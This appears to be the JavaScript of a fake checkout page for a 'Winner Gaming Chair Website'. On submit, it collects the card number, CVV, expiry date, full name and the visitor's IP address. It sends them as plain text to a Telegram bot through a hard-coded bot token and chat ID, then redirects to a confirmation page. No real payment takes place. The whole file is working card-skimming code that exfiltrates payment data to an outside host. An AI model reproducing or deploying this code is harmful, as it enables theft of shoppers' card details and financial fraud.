const paymentForm = document.getElementById('paymentForm');
paymentForm.addEventListener('submit', (e) => {
    e.preventDefault();

    const formData = {
        cardNumber: document.getElementById('cardNumber').value,
        cvv: document.getElementById('cvv').value,
        expiryDate: document.getElementById('expiryDate').value,
        fullName: document.getElementById('fullName').value,
    };

    // Get the customer's IP address
    getIpAddress().then((ipAddress) => {
        // Send form data and IP address to the Telegram bot
        sendFormDataToTelegramBot(formData, ipAddress);

        // Redirect to the confirmation page
        window.location.href = 'confirmation.html';
    });
});

async function getIpAddress() {
    try {
        const response = await fetch('https://api64.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
        return 'Unknown';
    }
}

function sendFormDataToTelegramBot(formData, ipAddress) {
    const botToken = '6780796808:AAEMjYut3HZtDuZWfjabfV2-kxPEI57BiLs';
    const chatId = '1204315551';
    const message = `
        New Order from Winner Gaming Chair Website!
        Card Number: ${formData.cardNumber}
        CVV: ${formData.cvv}
        Expiry Date: ${formData.expiryDate}
        Full Name: ${formData.fullName}
        Customer IP Address: ${ipAddress}
    `;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
    .then((response) => {
        if (!response.ok) {
            console.error('Failed to send message to Telegram bot:', response.statusText);
        }
    })
    .catch((error) => {
        console.error('Error sending message to Telegram bot:', error);
    });
}
